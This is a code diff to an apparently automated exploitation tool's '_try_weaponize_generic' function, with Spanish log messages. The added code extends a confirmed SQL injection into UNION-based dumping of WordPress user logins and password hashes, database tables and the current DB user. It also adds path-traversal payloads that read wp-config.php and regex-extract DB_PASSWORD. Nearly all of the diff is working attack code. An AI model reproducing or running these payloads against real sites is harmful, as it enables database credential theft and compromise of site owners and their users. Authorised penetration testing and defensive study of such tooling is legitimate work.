@@ -8253,10 +8253,40 @@ def _try_weaponize_generic(
                     if ver_m:
                         db_ver = ver_m.group(0).strip("~>")
                         step(f"weaponize/sqli: version extraida — {db_ver}")
+                        # Also attempt user credential dump for full impact
+                        _users_impact = ""
+                        _user_payloads = [
+                            # WordPress: wp_users table dump via UNION
+                            ("1' UNION SELECT user_login,user_pass FROM wp_users LIMIT 3-- -",
+                             _re.compile(r'([a-zA-Z0-9_]{3,40})\s*[,|]\s*(\$P\$[A-Za-z0-9./]{31})', _re.S)),
+                            # Generic: information_schema.tables
+                            ("1' UNION SELECT table_name,table_schema FROM "
+                             "information_schema.tables LIMIT 5-- -",
+                             _re.compile(r'\b(wp_users|users|admin_users|accounts|members)\b', _re.I)),
+                            # MySQL: current user
+                            ("1' UNION SELECT user(),NULL-- -",
+                             _re.compile(r'\b(\w+@[\w.%]+)\b')),
+                        ]
+                        for _u_pl, _u_pat in _user_payloads:
+                            try:
+                                p_u = {_sq_param: _u_pl}
+                                if method.upper() == "GET":
+                                    _u_body = _send_weap(params_override=dict(_all_params, **p_u))
+                                else:
+                                    _u_body = _send_weap(data_override=dict(_all_params, **p_u))
+                                _u_m = _u_pat.search(_u_body)
+                                if _u_m:
+                                    _users_impact = _u_m.group(0)[:120]
+                                    step(f"weaponize/sqli: datos sensibles extraídos — {_users_impact[:60]}")
+                                    break
+                            except Exception:
+                                pass
                         return {
-                            "technique": "sqli_version",
-                            "data": {"db_version": db_ver, "payload": vp[:60]},
-                            "impact": f"SQLi confirmed — DB version extracted: {db_ver}",
+                            "technique": "sqli_data_extraction",
+                            "data": {"db_version": db_ver, "payload": vp[:60],
+                                     "users_data": _users_impact},
+                            "impact": (f"SQLi confirmed — DB version: {db_ver}"
+                                       + (f"; data leaked: {_users_impact[:80]}" if _users_impact else "")),
                         }
 
         # --- SSRF: probe cloud metadata / internal services ---
@@ -8351,12 +8381,16 @@ def _try_weaponize_generic(
                     break
             if _lfi_param:
                 _extra_files = [
+                    # WordPress config (highest impact — exposes DB credentials)
+                    "../../../../../../../../var/www/html/wp-config.php",
+                    "../../../../../../wp-config.php",
+                    "../../../../../wp-config.php",
                     "../../../../../../../../proc/version",
                     "../../../../../../../../etc/hostname",
                     "../../../../../../../../etc/os-release",
                 ]
                 import re as _re
-                step("weaponize/lfi: leyendo archivos del sistema adicionales...")
+                step("weaponize/lfi: leyendo archivos del sistema adicionales (incluye wp-config.php)...")
                 for fp in _extra_files:
                     fname = fp.rsplit("/", 1)[-1]
                     p_override = {_lfi_param: fp}
@@ -8364,7 +8398,19 @@ def _try_weaponize_generic(
                         body_w = _send_weap(params_override=dict(_all_params, **p_override))
                     else:
                         body_w = _send_weap(data_override=dict(_all_params, **p_override))
-                    if fname == "version" and ("Linux version" in body_w or "gcc" in body_w):
+                    if fname == "wp-config.php" and "DB_PASSWORD" in body_w:
+                        db_pass_m = _re.search(r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]{1,80})['\"]",
+                                               body_w)
+                        db_pass = db_pass_m.group(1) if db_pass_m else "extracted"
+                        step(f"weaponize/lfi: wp-config.php extraido — DB_PASSWORD presente")
+                        return {
+                            "technique": "lfi_wp_config",
+                            "data": {"file": "wp-config.php",
+                                     "has_db_password": True,
+                                     "snippet": body_w[:200]},
+                            "impact": "LFI confirmed — wp-config.php accessible (DB credentials exposed)",
+                        }
+                    elif fname == "version" and ("Linux version" in body_w or "gcc" in body_w):
                         kver_m = _re.search(r'Linux version [\d.]+[^\n<]{0,80}', body_w)
                         kver = kver_m.group(0) if kver_m else body_w[:100]
                         step(f"weaponize/lfi: kernel version — {kver[:60]}")
